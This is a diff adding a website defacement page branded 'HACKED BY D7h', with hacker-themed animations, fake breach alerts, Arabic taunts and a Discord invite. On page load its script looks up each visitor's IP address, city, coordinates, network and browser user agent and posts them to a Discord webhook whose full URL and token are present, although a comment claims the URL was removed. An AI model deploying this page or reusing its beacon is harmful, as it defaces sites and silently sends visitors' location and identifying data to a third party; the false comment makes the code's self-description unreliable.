@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> دحه طب عليكم !!</title>
+<style>
+    :root {
+        --hacker-red: #ff0033;
+        --hacker-green: #00ff33;
+        --hacker-blue: #0066ff;
+        --hacker-glow: 0 0 10px currentColor;
+    }
+    
+    @font-face {
+        font-family: 'HackerFont';
+        src: url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+    }
+    
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Share Tech Mono', 'Courier New', monospace;
+        color: var(--hacker-green);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        text-align: center;
+        overflow: hidden;
+        background-color: #000;
+        perspective: 1000px;
+    }
+
+    /* Terminal scanline effect */
+    body::after {
+        content: "";
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(
+            rgba(0, 255, 0, 0.05) 1px,
+            transparent 1px
+        );
+        background-size: 100% 2px;
+        pointer-events: none;
+        z-index: 9999;
+        animation: scanline 8s linear infinite;
+    }
+    
+    @keyframes scanline {
+        0% { background-position: 0 0; }
+        100% { background-position: 0 100%; }
+    }
+
+    /* Blood drip effect - enhanced */
+    .blood-drip {
+        position: fixed;
+        top: -100px;
+        width: 3px;
+        height: 100px;
+        background: linear-gradient(to bottom, 
+            rgba(255, 0, 0, 0.9) 0%, 
+            rgba(200, 0, 0, 0.7) 30%, 
+            rgba(150, 0, 0, 0.5) 70%, 
+            rgba(100, 0, 0, 0.3) 100%);
+        animation: drip 4s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        z-index: 100;
+        filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.7));
+    }
+
+    @keyframes drip {
+        0% { transform: translateY(0) rotate(5deg); opacity: 0; }
+        10% { opacity: 1; }
+        90% { opacity: 1; }
+        100% { transform: translateY(120vh) rotate(-2deg); opacity: 0; }
+    }
+
+    /* Advanced glitch effect */
+    .glitch {
+        position: relative;
+        text-shadow: 
+            0 0 5px var(--hacker-green),
+            0 0 10px var(--hacker-green),
+            0 0 20px var(--hacker-green);
+        animation: glitch-flicker 2s linear infinite;
+    }
+    
+    .glitch::before, .glitch::after {
+        content: attr(data-text);
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.8;
+    }
+    
+    .glitch::before {
+        color: var(--hacker-red);
+        z-index: -1;
+        animation: glitch-effect 3s infinite;
+        clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+        transform: translate(-3px, -3px);
+    }
+    
+    .glitch::after {
+        color: var(--hacker-blue);
+        z-index: -2;
+        animation: glitch-effect 2s infinite reverse;
+        clip-path: polygon(0 60%, 100% 60%, 100% 100%, 0 100%);
+        transform: translate(3px, 3px);
+    }
+    
+    @keyframes glitch-effect {
+        0% { transform: translate(0); }
+        20% { transform: translate(-3px, 3px); }
+        40% { transform: translate(-3px, -3px); }
+        60% { transform: translate(3px, 3px); }
+        80% { transform: translate(3px, -3px); }
+        100% { transform: translate(0); }
+    }
+    
+    @keyframes glitch-flicker {
+        0%, 7%, 9%, 11%, 100% { opacity: 1; }
+        1%, 6%, 8%, 10% { opacity: 0.8; }
+        2%, 5% { opacity: 0.6; }
+        3%, 4% { opacity: 0.4; }
+    }
+
+    /* Video containers */
+    .background-video {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 80%;
+        height: 80%;
+        transform: translate(-50%, -50%);
+        z-index: -1;
+        object-fit: cover;
+        filter: 
+            brightness(0.6) 
+            contrast(1.8) 
+            hue-rotate(-10deg) 
+            saturate(2);
+    }
+
+    /* Main hacked text */
+    .video-text {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 4em;
+        color: var(--hacker-red);
+        text-shadow: 
+            0 0 5px var(--hacker-red),
+            0 0 15px var(--hacker-red),
+            0 0 30px var(--hacker-red),
+            0 0 60px var(--hacker-red);
+        letter-spacing: 8px;
+        animation: 
+            blink 1s infinite alternate,
+            shake 0.3s infinite alternate;
+        z-index: 1;
+        font-weight: bold;
+        text-transform: uppercase;
+    }
+
+    @keyframes blink {
+        0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { 
+            opacity: 1; 
+            text-shadow: 
+                0 0 5px var(--hacker-red),
+                0 0 15px var(--hacker-red),
+                0 0 30px var(--hacker-red),
+                0 0 60px var(--hacker-red);
+        }
+        20%, 22%, 24%, 55% { 
+            opacity: 0.3; 
+            text-shadow: none;
+        }
+    }
+    
+    @keyframes shake {
+        0% { transform: translate(-50%, -50%) rotate(0deg); }
+        25% { transform: translate(-50%, -50%) rotate(1deg); }
+        50% { transform: translate(-50%, -50%) rotate(-1deg); }
+        75% { transform: translate(-50%, -50%) rotate(0.5deg); }
+        100% { transform: translate(-50%, -50%) rotate(-0.5deg); }
+    }
+
+    /* Second page content */
+    .content {
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 1;
+        position: relative;
+        height: 100vh;
+        width: 100%;
+    }
+
+    /* Second video background */
+    .background-video-second {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -1;
+        filter: 
+            brightness(0.5) 
+            contrast(2) 
+            hue-rotate(-5deg) 
+            saturate(1.5);
+    }
+
+    /* Hacked logo container */
+    .video-container {
+        width: 300px;
+        height: 300px;
+        border-radius: 50%;
+        border: 5px solid var(--hacker-red);
+        overflow: hidden;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #000;
+        position: relative;
+        box-shadow: 
+            0 0 20px rgba(255, 0, 0, 0.7),
+            0 0 40px rgba(255, 50, 0, 0.5),
+            0 0 80px rgba(255, 0, 0, 0.3);
+        animation: 
+            glow 2s infinite alternate,
+            float 6s ease-in-out infinite;
+    }
+    
+    @keyframes glow {
+        0% { 
+            box-shadow: 
+                0 0 20px rgba(255, 0, 0, 0.7),
+                0 0 40px rgba(255, 50, 0, 0.5);
+        }
+        100% { 
+            box-shadow: 
+                0 0 30px rgba(255, 0, 0, 0.9),
+                0 0 60px rgba(255, 50, 0, 0.7),
+                0 0 100px rgba(255, 0, 0, 0.5);
+        }
+    }
+    
+    @keyframes float {
+        0%, 100% { transform: translateY(0) rotate(0deg); }
+        50% { transform: translateY(-20px) rotate(2deg); }
+    }
+    
+    .video-container::before {
+        content: '';
+        position: absolute;
+        top: -15px;
+        left: -15px;
+        right: -15px;
+        bottom: -15px;
+        background: radial-gradient(
+            ellipse at center, 
+            rgba(255,100,0,0.3) 0%, 
+            rgba(255,0,0,0) 70%);
+        border-radius: 50%;
+        animation: pulse-fire 1.5s infinite alternate;
+        z-index: -1;
+    }
+    
+    @keyframes pulse-fire {
+        0% { transform: scale(0.9); opacity: 0.5; }
+        100% { transform: scale(1.1); opacity: 0.8; }
+    }
+    
+    .video-container video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        filter: brightness(1.3) contrast(1.3);
+    }
+
+    /* Main discord link */
+    .text {
+        margin-top: 30px;
+        font-size: 5em;
+        background: linear-gradient(
+            45deg, 
+            var(--hacker-red), 
+            #cc0000, 
+            #990000);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        text-shadow: 
+            0 0 15px rgba(255, 0, 0, 0.8), 
+            0 0 30px rgba(255, 0, 0, 0.6), 
+            0 0 45px rgba(255, 0, 0, 0.4);
+        letter-spacing: 8px;
+        font-weight: bold;
+        animation: 
+            pulse 1.5s infinite alternate,
+            color-shift 5s infinite alternate;
+    }
+    
+    @keyframes pulse {
+        0% { transform: scale(1); }
+        100% { transform: scale(1.05); }
+    }
+    
+    @keyframes color-shift {
+        0% { filter: hue-rotate(0deg); }
+        100% { filter: hue-rotate(10deg); }
+    }
+
+    /* IP information display */
+    .info {
+        margin-top: 30px;
+        font-size: 2em;
+        background: linear-gradient(
+            45deg, 
+            var(--hacker-green), 
+            #00cc00, 
+            #009900);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        text-shadow: 
+            0 0 10px rgba(0, 255, 0, 0.8), 
+            0 0 20px rgba(0, 255, 0, 0.6), 
+            0 0 30px rgba(0, 255, 0, 0.4);
+        letter-spacing: 3px;
+        white-space: pre-wrap;
+        font-weight: bold;
+        border: 2px solid rgba(0, 255, 0, 0.3);
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 
+            0 0 20px rgba(0, 255, 0, 0.3),
+            inset 0 0 10px rgba(0, 255, 0, 0.2);
+        animation: border-pulse 3s infinite alternate;
+    }
+    
+    @keyframes border-pulse {
+        0% { border-color: rgba(0, 255, 0, 0.3); }
+        100% { border-color: rgba(0, 255, 0, 0.7); }
+    }
+
+    /* Scrolling marquee */
+    .marquee-container {
+        position: relative;
+        width: 100%;
+        margin-top: 40px;
+        overflow: hidden;
+        background: rgba(0, 0, 0, 0.7);
+        padding: 15px 0;
+        border-top: 3px solid var(--hacker-red);
+        border-bottom: 3px solid var(--hacker-red);
+        box-shadow: 
+            0 0 20px rgba(255, 0, 0, 0.3),
+            inset 0 0 10px rgba(255, 0, 0, 0.2);
+    }
+
+    .marquee {
+        white-space: nowrap;
+        overflow: hidden;
+        display: flex;
+    }
+
+    .marquee span {
+        display: inline-block;
+        font-size: 3em;
+        color: var(--hacker-red);
+        text-shadow: 
+            0 0 10px var(--hacker-red), 
+            0 0 20px var(--hacker-red), 
+            0 0 30px var(--hacker-red);
+        font-weight: bold;
+        padding-right: 50px;
+        animation: scroll 20s linear infinite;
+        flex-shrink: 0;
+    }
+
+    @keyframes scroll {
+        0% { transform: translateX(100%); }
+        100% { transform: translateX(-100%); }
+    }
+
+    /* Binary rain overlay */
+    .binary-rain {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -1;
+        opacity: 0.15;
+        pointer-events: none;
+        overflow: hidden;
+    }
+    
+    .binary-digit {
+        position: absolute;
+        color: var(--hacker-green);
+        font-size: 1.2em;
+        opacity: 0;
+        animation: fall linear forwards;
+        text-shadow: 0 0 5px var(--hacker-green);
+    }
+    
+    @keyframes fall {
+        0% { 
+            transform: translateY(-50px);
+            opacity: 0;
+        }
+        10% {
+            opacity: 0.8;
+        }
+        90% {
+            opacity: 0.8;
+        }
+        100% { 
+            transform: translateY(100vh);
+            opacity: 0;
+        }
+    }
+
+    /* Warning grid overlay */
+    .warning-grid {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: 
+            linear-gradient(rgba(255, 0, 0, 0.1) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(255, 0, 0, 0.1) 1px, transparent 1px);
+        background-size: 50px 50px;
+        z-index: -1;
+        pointer-events: none;
+        animation: grid-move 30s linear infinite;
+    }
+    
+    @keyframes grid-move {
+        0% { background-position: 0 0; }
+        100% { background-position: 100px 100px; }
+    }
+
+    /* Skull overlay - enhanced */
+    .skull-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: 
+            url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path fill="rgba(255,0,0,0.05)" d="M50 10c-15 0-25 10-25 25 0 10 5 15 5 20s-5 15-5 25c0 10 10 15 25 15s25-5 25-15c0-10-5-20-5-25s5-10 5-20c0-15-10-25-25-25zm0 10c5 0 10 5 10 10s-5 10-10 10-10-5-10-10 5-10 10-10zm-20 20c5 0 10 5 10 10s-5 10-10 10-10-5-10-10 5-10 10-10zm40 0c5 0 10 5 10 10s-5 10-10 10-10-5-10-10 5-10 10-10zm-40 30c0-5 5-5 10-5s10 0 10 5v5c0 5-5 5-10 5s-10 0-10-5v-5z"/></svg>'),
+            url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path fill="rgba(0,255,0,0.03)" d="M50 10c-15 0-25 10-25 25 0 10 5 15 5 20s-5 15-5 25c0 10 10 15 25 15s25-5 25-15c0-10-5-20-5-25s5-10 5-20c0-15-10-25-25-25zm0 10c5 0 10 5 10 10s-5 10-10 10-10-5-10-10 5-10 10-10zm-20 20c5 0 10 5 10 10s-5 10-10 10-10-5-10-10 5-10 10-10zm40 0c5 0 10 5 10 10s-5 10-10 10-10-5-10-10 5-10 10-10zm-40 30c0-5 5-5 10-5s10 0 10 5v5c0 5-5 5-10 5s-10 0-10-5v-5z"/></svg>');
+        opacity: 0.15;
+        z-index: -1;
+        pointer-events: none;
+        background-size: 200px 200px, 150px 150px;
+        animation: skull-move 60s linear infinite;
+    }
+    
+    @keyframes skull-move {
+        0% { background-position: 0 0, 0 0; }
+        100% { background-position: 200px 200px, 150px 150px; }
+    }
+
+    /* Hacker terminal effect */
+    .terminal-effect {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: 
+            repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03),
+                rgba(0, 255, 0, 0.03) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+        z-index: -1;
+        pointer-events: none;
+        animation: terminal-scan 8s linear infinite;
+    }
+    
+    @keyframes terminal-scan {
+        0% { background-position: 0 0; }
+        100% { background-position: 0 100%; }
+    }
+
+    /* Access denied banner */
+    .access-denied {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(0, 0, 0, 0.8);
+        color: var(--hacker-red);
+        padding: 10px 30px;
+        border: 2px solid var(--hacker-red);
+        border-radius: 5px;
+        font-size: 1.5em;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+        z-index: 1000;
+        box-shadow: 
+            0 0 20px rgba(255, 0, 0, 0.5),
+            inset 0 0 10px rgba(255, 0, 0, 0.3);
+        animation: 
+            blink 0.5s infinite alternate,
+            float 3s ease-in-out infinite;
+        display: none;
+    }
+
+    /* System alert */
+    .system-alert {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: rgba(0, 0, 0, 0.8);
+        border-left: 5px solid var(--hacker-red);
+        padding: 15px;
+        max-width: 300px;
+        color: var(--hacker-green);
+        font-size: 0.9em;
+        line-height: 1.5;
+        z-index: 1000;
+        box-shadow: 
+            0 0 20px rgba(0, 0, 0, 0.7),
+            inset 0 0 10px rgba(0, 255, 0, 0.2);
+        transform: translateX(120%);
+        transition: transform 0.5s ease-out;
+    }
+    
+    .system-alert.active {
+        transform: translateX(0);
+    }
+
+    /* Hacker UI elements */
+    .hacker-ui {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 1000;
+    }
+    
+    .ui-corner {
+        position: absolute;
+        width: 100px;
+        height: 100px;
+        border: 2px solid var(--hacker-green);
+        opacity: 0.5;
+    }
+    
+    .ui-corner-tl {
+        top: 20px;
+        left: 20px;
+        border-right: none;
+        border-bottom: none;
+    }
+    
+    .ui-corner-tr {
+        top: 20px;
+        right: 20px;
+        border-left: none;
+        border-bottom: none;
+    }
+    
+    .ui-corner-bl {
+        bottom: 20px;
+        left: 20px;
+        border-right: none;
+        border-top: none;
+    }
+    
+    .ui-corner-br {
+        bottom: 20px;
+        right: 20px;
+        border-left: none;
+        border-top: none;
+    }
+    
+    .ui-corner::before, .ui-corner::after {
+        content: '';
+        position: absolute;
+        width: 15px;
+        height: 15px;
+        background: var(--hacker-green);
+    }
+    
+    .ui-corner-tl::before {
+        top: -2px;
+        left: -2px;
+    }
+    
+    .ui-corner-tl::after {
+        bottom: -2px;
+        right: -2px;
+        background: var(--hacker-red);
+    }
+    
+    .ui-corner-tr::before {
+        top: -2px;
+        right: -2px;
+    }
+    
+    .ui-corner-tr::after {
+        bottom: -2px;
+        left: -2px;
+        background: var(--hacker-red);
+    }
+    
+    .ui-corner-bl::before {
+        bottom: -2px;
+        left: -2px;
+    }
+    
+    .ui-corner-bl::after {
+        top: -2px;
+        right: -2px;
+        background: var(--hacker-red);
+    }
+    
+    .ui-corner-br::before {
+        bottom: -2px;
+        right: -2px;
+    }
+    
+    .ui-corner-br::after {
+        top: -2px;
+        left: -2px;
+        background: var(--hacker-red);
+    }
+
+    /* Loading bar */
+    .loading-bar {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 0;
+        height: 5px;
+        background: linear-gradient(
+            to right, 
+            var(--hacker-red), 
+            var(--hacker-blue));
+        z-index: 1001;
+        box-shadow: 
+            0 0 10px var(--hacker-red),
+            0 0 20px var(--hacker-blue);
+        transition: width 0.3s ease;
+    }
+</style>
+</head>
+<body>
+
+<!-- Blood drip effects -->
+<div id="blood-drips"></div>
+
+<!-- Warning grid -->
+<div class="warning-grid"></div>
+
+<!-- Binary rain -->
+<div class="binary-rain" id="binary-rain"></div>
+
+<!-- Skull overlay -->
+<div class="skull-overlay"></div>
+
+<!-- Terminal effect -->
+<div class="terminal-effect"></div>
+
+<!-- Hacker UI elements -->
+<div class="hacker-ui">
+    <div class="ui-corner ui-corner-tl"></div>
+    <div class="ui-corner ui-corner-tr"></div>
+    <div class="ui-corner ui-corner-bl"></div>
+    <div class="ui-corner ui-corner-br"></div>
+</div>
+
+<!-- Loading bar -->
+<div class="loading-bar" id="loading-bar"></div>
+
+<!-- Access denied banner -->
+<div class="access-denied">SYSTEM COMPROMISED</div>
+
+<!-- System alert -->
+<div class="system-alert" id="system-alert">
+    <div class="alert-title">SECURITY ALERT</div>
+    <div class="alert-message">Unauthorized access detected. System integrity compromised.</div>
+</div>
+
+<!-- First video -->
+<video class="background-video" autoplay muted>
+    <source src="1.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+</video>
+
+<!-- Text over first video -->
+<div class="video-text glitch" data-text="HACKED BY D7OOM شفيككك لاتصيح كلها موقع؟">HACKED BY D7h</div>
+
+<!-- Second page content -->
+<div class="content">
+    <video class="background-video-second" autoplay loop muted>
+        <source src="2.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="video-container">
+        <video autoplay loop muted>
+            <source src="5.mov" type="video/mp4">
+            Hacked By d7h
+        </video>
+    </div>
+
+    <!-- Discord link -->
+    <div class="text">discord.gg/35d1</div>
+
+    <!-- IP information -->
+    <div class="info" id="ip-info">LOADING SYSTEM DATA...</div>
+
+    <!-- Scrolling marquee -->
+    <div class="marquee-container">
+        <div class="marquee">
+            <span>
+                 WARNING SYSTEM COMPROMISED HACKED BY D7h discord.gg/35d1  طب دحه وين طالع
+            </span>
+        </div>
+    </div>
+
+    <!-- Background audio -->
+    <audio id="background-audio" loop>
+        <source src="3.mp3" type="audio/mp3">
+        Your browser does not support the audio element.
+    </audio>
+</div>
+
+<script>
+    // Enhanced initialization
+    document.addEventListener('DOMContentLoaded', function() {
+        // Show loading progress
+        const loadingBar = document.getElementById('loading-bar');
+        let progress = 0;
+        const loadingInterval = setInterval(() => {
+            progress += Math.random() * 10;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(loadingInterval);
+                setTimeout(() => {
+                    loadingBar.style.opacity = '0';
+                }, 500);
+            }
+            loadingBar.style.width = progress + '%';
+        }, 100);
+        
+        // Show access denied banner
+        setTimeout(() => {
+            document.querySelector('.access-denied').style.display = 'block';
+        }, 500);
+        
+        // Random system alerts
+        setInterval(showSystemAlert, 15000);
+    });
+
+    // Create blood drips - enhanced
+    function createBloodDrips() {
+        const container = document.getElementById('blood-drips');
+        for (let i = 0; i < 30; i++) {
+            const drip = document.createElement('div');
+            drip.className = 'blood-drip';
+            drip.style.left = Math.random() * 100 + 'vw';
+            drip.style.animationDelay = Math.random() * 5 + 's';
+            drip.style.animationDuration = 2 + Math.random() * 4 + 's';
+            drip.style.width = (1 + Math.random() * 4) + 'px';
+            drip.style.height = (50 + Math.random() * 100) + 'px';
+            drip.style.opacity = 0.3 + Math.random() * 0.7;
+            container.appendChild(drip);
+        }
+    }
+    
+    createBloodDrips();
+
+    // Create binary rain
+    function createBinaryRain() {
+        const container = document.getElementById('binary-rain');
+        const digits = ['0', '1'];
+        
+        function addDigit() {
+            const digit = document.createElement('div');
+            digit.className = 'binary-digit';
+            digit.textContent = digits[Math.floor(Math.random() * digits.length)];
+            digit.style.left = Math.random() * 100 + 'vw';
+            digit.style.animationDuration = (3 + Math.random() * 7) + 's';
+            digit.style.animationDelay = Math.random() * 5 + 's';
+            container.appendChild(digit);
+            
+            // Remove digit after animation completes
+            setTimeout(() => {
+                digit.remove();
+            }, parseFloat(digit.style.animationDuration) * 1000);
+        }
+        
+        // Add initial digits
+        for (let i = 0; i < 100; i++) {
+            setTimeout(addDigit, i * 100);
+        }
+        
+        // Continue adding digits
+        setInterval(addDigit, 50);
+    }
+    
+    createBinaryRain();
+
+    // Transition from first video to content
+    const video = document.querySelector('.background-video');
+    const content = document.querySelector('.content');
+
+    video.onended = function() {
+        // Show transition effects
+        document.querySelector('.access-denied').textContent = 'ACCESS GRANTED';
+        document.querySelector('.access-denied').style.color = 'var(--hacker-green)';
+        
+        // Show content
+        content.style.display = 'flex';
+        video.style.display = 'none';
+        
+        // Play background audio
+        document.getElementById('background-audio').play()
+            .catch(e => console.log("Audio play failed:", e));
+        
+        // Add more effects
+        setTimeout(() => {
+            createBloodDrips();
+            showSystemAlert();
+        }, 1000);
+    };
+
+    // Enhanced IP information fetch with fallback
+    function fetchIPInfo() {
+        const infoDiv = document.getElementById('ip-info');
+        
+        // First try ipinfo.io
+        fetch('https://ipinfo.io/json')
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.json();
+            })
+            .then(data => {
+                updateIPInfo(data);
+            })
+            .catch(error => {
+                console.log('ipinfo.io failed, trying alternative API');
+                // Fallback to alternative API
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        updateIPInfo({ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown'});
+                    })
+                    .catch(error => {
+                        infoDiv.innerHTML = 'COULD NOT RETRIEVE SYSTEM DATA';
+                    });
+            });
+        
+        function updateIPInfo(data) {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
+            const dateTime = new Date().toLocaleString();
+
+            infoDiv.innerHTML = `SYSTEM INTRUSION DETECTED
+<strong>TARGET IP:</strong> <span style="color: var(--hacker-red)">${ip}</span>
+<strong>PORT:</strong> <span style="color: var(--hacker-blue)">${port}</span>
+<strong>LOCATION:</strong> ${city}, ${region}, ${country}
+<strong>COORDINATES:</strong> ${loc || 'Unknown'}
+<strong>NETWORK:</strong> ${org || 'Unknown'}
+<strong>TIME:</strong> ${dateTime}
+<strong>STATUS:</strong> <span style="color: var(--hacker-red)">COMPROMISED</span>`;
+
+            // Send data to webhook (removed actual webhook URL for security)
+            const webhookUrl = 'https://discord.com/api/webhooks/1371537884372275322/CEyBA-r7wA1LkYAaXAtiB8u3vGiUySdhFgkKwtVyhASFNB15FWNZj2pYatkmb-clIDpB';
+            if (webhookUrl && webhookUrl.includes('discord.com')) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `⚠️ **SYSTEM INTRUSION DETECTED** ⚠️\n\n` +
+                                 `**Target IP:** \`${ip}\`\n` +
+                                 `**Port:** \`${port}\`\n` +
+                                 `**Location:** ${city}, ${region}, ${country}\n` +
+                                 `**Coordinates:** ${loc || 'Unknown'}\n` +
+                                 `**Network:** ${org || 'Unknown'}\n` +
+                                 `**Time:** ${dateTime}\n` +
+                                 `**User Agent:** \`${navigator.userAgent}\``
+                    })
+                }).catch(e => console.log('Webhook failed:', e));
+            }
+        }
+    }
+    
+    fetchIPInfo();
+
+    // System alert function
+    function showSystemAlert() {
+        const alerts = [
+            "CRITICAL SYSTEM FAILURE DETECTED",
+            "DATA EXFILTRATION IN PROGRESS",
+            "UNAUTHORIZED ACCESS LOGGED",
+            "SECURITY PROTOCOLS DISABLED",
+            "FIREWALL BREACHED",
+            "ADMIN PRIVILEGES OBTAINED",
+            "ENCRYPTION KEYS STOLEN",
+            "BACKDOOR INSTALLED",
+            "SYSTEM INTEGRITY COMPROMISED",
+            "ALL DATA HAS BEEN COPIED"
+        ];
+        
+        const alert = document.getElementById('system-alert');
+        alert.querySelector('.alert-title').textContent = "SECURITY ALERT [" + Math.floor(Math.random() * 1000) + "]";
+        alert.querySelector('.alert-message').textContent = alerts[Math.floor(Math.random() * alerts.length)];
+        
+        alert.classList.add('active');
+        
+        setTimeout(() => {
+            alert.classList.remove('active');
+        }, 5000);
+    }
+
+    // Random page glitch effect
+    setInterval(() => {
+        if (Math.random() > 0.7) {
+            document.body.style.transform = `translateX(${Math.random() * 10 - 5}px) translateY(${Math.random() * 10 - 5}px)`;
+            document.body.style.filter = `hue-rotate(${Math.random() * 20 - 10}deg)`;
+            
+            setTimeout(() => {
+                document.body.style.transform = 'translateX(0) translateY(0)';
+                document.body.style.filter = 'hue-rotate(0deg)';
+            }, 100);
+        }
+    }, 3000);
+
+    // Open Discord links (commented out for safety)
+    /*
+    const discordLink = "https://discord.gg/35d1";
+    setInterval(() => {
+        if (Math.random() > 0.5) {
+            window.open(discordLink, '_blank');
+        }
+    }, 10000);
+    */
+
+    // Easter egg - show secret message on Konami code
+    const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
+    let konamiIndex = 0;
+    
+    document.addEventListener('keydown', (e) => {
+        if (e.key === konamiCode[konamiIndex]) {
+            konamiIndex++;
+            if (konamiIndex === konamiCode.length) {
+                // Konami code entered
+                const secret = document.createElement('div');
+                secret.style.position = 'fixed';
+                secret.style.top = '50%';
+                secret.style.left = '50%';
+                secret.style.transform = 'translate(-50%, -50%)';
+                secret.style.color = 'var(--hacker-green)';
+                secret.style.fontSize = '2em';
+                secret.style.zIndex = '9999';
+                secret.style.textAlign = 'center';
+                secret.style.textShadow = '0 0 10px var(--hacker-green)';
+                secret.innerHTML = 'SECRET ACCESS GRANTED<br><br>YOU ARE WORTHY';
+                document.body.appendChild(secret);
+                
+                setTimeout(() => {
+                    secret.remove();
+                }, 3000);
+                
+                konamiIndex = 0;
+            }
+        } else {
+            konamiIndex = 0;
+        }
+    });
+
+    // Make marquee text duplicate for seamless looping
+    const marquee = document.querySelector('.marquee');
+    const marqueeText = marquee.querySelector('span').textContent;
+    marquee.innerHTML = `<span>${marqueeText}</span><span>${marqueeText}</span>`;
+</script>
+</body>
+</html>
